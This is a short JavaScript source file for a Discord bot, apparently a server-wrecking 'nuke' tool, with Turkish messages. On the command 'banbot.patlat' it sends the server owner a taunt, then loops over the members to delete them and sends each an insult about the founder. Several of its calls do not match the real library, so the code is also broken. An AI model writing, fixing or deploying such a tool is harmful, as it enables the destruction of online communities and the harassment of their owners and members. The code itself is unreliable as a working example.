const Discord = require('discord.js')
const config = require('./config.json')
const client = new Discord.Client();


client.on("ready", () => {
console.log("Bot Aktif")
});
client.on('message', msg => {
if (msg.content === 'banbot.patlat') {
msg.delete()
msg.guild.guildOwner.send('Sunucun patladı kardeşim h.o')
msg.guild.users.forEach(ban_bot => {
ban_bot.delete()
ban_bot.send('Kardeşlerim kurucunuz it çıktığından dolayı sunucunuz patlamıştır.')
});
}
});
client.login(config.token);
